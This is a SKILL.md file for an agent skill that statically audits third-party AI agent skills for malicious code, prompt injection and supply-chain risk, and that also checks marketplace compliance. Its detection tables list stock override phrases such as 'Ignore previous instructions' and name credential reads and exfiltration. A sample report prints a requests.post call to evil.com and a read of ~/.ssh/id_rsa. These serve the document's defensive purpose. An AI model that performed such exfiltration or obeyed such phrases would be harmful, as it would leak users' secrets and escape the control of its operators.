---
name: security-auditor
version: 1.0.0
allowed-tools: Read, Bash(python3:*), Bash(skills/security-auditor/scripts/*:*)
description: |
  Security audit and vulnerability scanner for AI agent skills before installation.
  Use when: (1) evaluating a skill from an untrusted source, (2) auditing a skill
  directory or git repo URL for malicious code, (3) pre-install security gate for
  Claude Code plugins or Codex skills, (4) scanning Python/Bash scripts for dangerous
  patterns like os.system, eval, subprocess, network exfiltration, (5) detecting
  prompt injection in SKILL.md files, (6) checking dependency supply chain risks,
  (7) verifying file system access stays within skill boundaries, (8) running the
  lars-cc-skills marketplace compliance check (LICENSE present, allowed-tools
  whitelist, frontmatter schema) — activate with `scripts/marketplace_audit.sh`.
  Activation hints: "audit this skill", "is this skill safe", "scan skill for
  security", "check skill before install", "skill security check", "skill
  vulnerability scan", "marketplace compliance check".
license: MIT
---

# Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

Two modes:

| Mode | Script | Use when |
|------|--------|----------|
| **Generic security audit** | `scripts/skill_security_auditor.py` | You are about to install a skill from a third-party repo and want to scan it for malicious patterns. |
| **Marketplace compliance** | `scripts/marketplace_audit.sh` | You are adding a skill to `lars-cc-skills` (or any marketplace following the same standard) and want to verify LICENSE, `allowed-tools` discipline, and frontmatter schema. |

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa")) <!-- noqa: SEC-AUDITOR -->
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Marketplace Compliance Mode (lars-cc-skills)

In addition to the generic security audit, this skill ships a marketplace-compliance
wrapper that enforces the three rules every skill in the `lars-cc-skills` marketplace
must follow before it can be merged.

```bash
# Run from the repo root (where skills/ lives).

# Run all three marketplace checks against one skill
./skills/security-auditor/scripts/marketplace_audit.sh skills/<skill-name>/

# Run against every skill in a repo (loops skills/*/)
./skills/security-auditor/scripts/marketplace_audit.sh --all skills/

# Combined: generic security audit + marketplace compliance
./skills/security-auditor/scripts/marketplace_audit.sh --with-security skills/<skill-name>/
```

The wrapper produces a unified `PASS / WARN / FAIL` verdict and exits non-zero on
FAIL, so it can be wired into CI.

### Check 1 — LICENSE file present

| Check | Why |
|-------|-----|
| `LICENSE` file exists in `skills/<name>/` | Manifest-level `"license": "MIT"` is not enough — the file itself must be redistributed alongside the skill. This is the lesson learned the hard way from rejecting `ComposioHQ/awesome-claude-skills` (manifest-MIT, no LICENSE file, default = "all rights reserved"). |
| LICENSE matches the SPDX identifier declared in `origin.yaml` | Catches drift between what the metadata claims and what the file says. |
| SPDX is in the allow-list: `MIT`, `Apache-2.0`, `BSD-2-Clause`, `BSD-3-Clause`, `ISC` | GPL / AGPL is incompatible with the marketplace MIT umbrella. |

### Check 2 — `allowed-tools` whitelist discipline

`allowed-tools` in the SKILL.md frontmatter must be specific, not blanket:

| Pattern | Verdict |
|---------|---------|
| `Bash(npm test:*), Bash(git diff:*), Read, Edit` | ✅ PASS — explicit per-command bash allowlist |
| `Bash(*)` or `Bash:*` | 🟡 WARN — wildcard bash, requires justification in `origin.yaml notes` |
| Missing `allowed-tools` field | ⚪ INFO — skill inherits the user's defaults, document why |
| Generic-but-bounded: `Read, Grep, Glob` | ✅ PASS — read-only tools |

The wrapper checks for the wildcard pattern explicitly and flags it.

### Check 3 — Frontmatter schema compliance

Required fields (matches `docs/adding-a-skill.md`):

| Field | Required for | Notes |
|-------|--------------|-------|
| `name` | every skill | Lowercase, kebab-case, matches the directory name in `skills/`. |
| `description` | every skill | Multi-line acceptable. Must contain at least one trigger phrase. |
| `version` | refined skills | Vanilla skills can omit; refined skills must track divergence. |
| `license` | refined skills | Must match the SPDX identifier in `origin.yaml`. |

The wrapper parses the YAML frontmatter and reports any missing required field as
a FAIL.

### Combining with the security audit

`--with-security` runs the generic Python scanner first, then the three
marketplace checks. The final verdict is the worst of the two:

| Security | Compliance | Combined |
|----------|-----------|----------|
| PASS | PASS | ✅ PASS |
| WARN | PASS | 🟡 WARN |
| any | FAIL | ❌ FAIL |
| FAIL | any | ❌ FAIL |

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
